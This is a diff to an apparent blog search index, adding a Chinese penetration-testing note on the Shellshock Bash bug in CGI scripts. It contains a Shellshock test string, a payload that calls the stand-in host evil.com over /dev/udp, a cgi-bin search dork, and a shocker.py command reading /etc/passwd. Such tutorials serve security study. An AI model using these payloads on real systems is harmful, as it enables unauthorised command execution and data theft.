@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>渗透测试中shellshock攻击原理介绍以及条件使用</title>
+      <link href="/2023/12/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADshellshock%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%9D%A1%E4%BB%B6%E4%BD%BF%E7%94%A8/"/>
+      <url>/2023/12/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADshellshock%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%9D%A1%E4%BB%B6%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h1><p>CGI(Common Gateway Interface)用于在Web服务器和应用程序之间传递信息。它允许Web服务器调用外部程序（通常是脚本），并将用户请求传递给这些程序，然后将程序生成的结果返回给用户。</p><p><strong>Shellshock</strong>，又称<strong>Bashdoor</strong>，是在Unix中广泛使用的Bash shell中的一个安全漏洞，首次于2014年9月24日公开。许多互联网守护进程，如网页服务器，使用bash来处理某些命令，从而允许攻击者在易受攻击的Bash版本上执行任意代码。这可使攻击者在未授权的情况下访问计算机系统。</p><p>shellshock存在于Bash（Bourne Again SHell）软件中。这个漏洞允许攻击者通过构造特殊的环境变量，在受影响的系统上执行任意的Shell命令。Shellshock 漏洞曝露了许多Web服务器上运行的CGI脚本的风险，因为这些脚本可能会调用Bash解释器，并由于漏洞而受到攻击。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="Shellshock漏洞执行的条件"><a href="#Shellshock漏洞执行的条件" class="headerlink" title="Shellshock漏洞执行的条件"></a>Shellshock漏洞执行的条件</h2><p>1、影响的 Bash 版本主要是在 1.14 到 4.3 之间<br>2、可以猜出/cgi-bin/下目录的文件；例如：/cgi-bin/test-cgi、/cgi-bin/test.sh、/cgi-bin/test.py、/cgi-bin/test.perl等等；<br>3、/cgi-bin/下的脚本文件通过系统环境变量调用bash的环境；</p><h2 id="发现测试"><a href="#发现测试" class="headerlink" title="发现测试"></a>发现测试</h2><p>env x=’() { : ;};echo vulnerable’ bash -c “echo test”</p><p>解释:</p><p><code>env x='() { : ;};echo vulnerable'</code>：这一部分定义了一个名为 <code>x</code> 的环境变量，其值是一个特殊构造的Shell函数。这个Shell函数被设计用于利用Shellshock漏洞。函数的主体是 <code>echo vulnerable</code>，这部分代码会被漏洞利用。</p><p><code>'() { : ;}</code>：这部分是一个函数定义，它的名称是空字符串，紧接着是一对花括号 <code>{}</code>。花括号内的内容是函数体，这里是 <code>: ;</code>，表示一个空操作（<code>:</code> 是一个什么也不做的命令，<code>;</code> 是命令分隔符）。</p><p>由于函数的错误定义，在函数之后的命令会被执行。</p><p>() { :;}; echo 1 &gt; /dev/udp/evil.com/53</p><p>如果服务器存在shellshcok漏洞，则evil.com的53端口会受到一个UDP包</p><h2 id="Apache-CGI脚本命令执行条件"><a href="#Apache-CGI脚本命令执行条件" class="headerlink" title="Apache CGI脚本命令执行条件"></a>Apache CGI脚本命令执行条件</h2><p>(1)apacheWeb服务器</p><p>(2)mod_cgi需要开启</p><p>(3)有xxx.cgi脚本</p><p>(4)监听器能接收到连接</p><p>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</p><p>而HTTP协议的头User-Agent通常是通过环境变量HTTP_USER_AGENT来传递的。</p><p>目标发现</p><p>inurl:cgi-bin</p><p>CGI-BIN 目录是存放CGI脚本的地方。这些脚本使WWW服务器和浏览器能运行外部程序</p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><a href="https://github.com/nccgroup/shocker">https://github.com/nccgroup/shocker</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 shocker.py -H 127.0.0.1 --command "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(六二)之THMUranium CTF</title>
       <link href="/2023/12/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AD%E4%BA%8C)%E4%B9%8BTHMUranium%20CTF/"/>
       <url>/2023/12/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AD%E4%BA%8C)%E4%B9%8BTHMUranium%20CTF/</url>
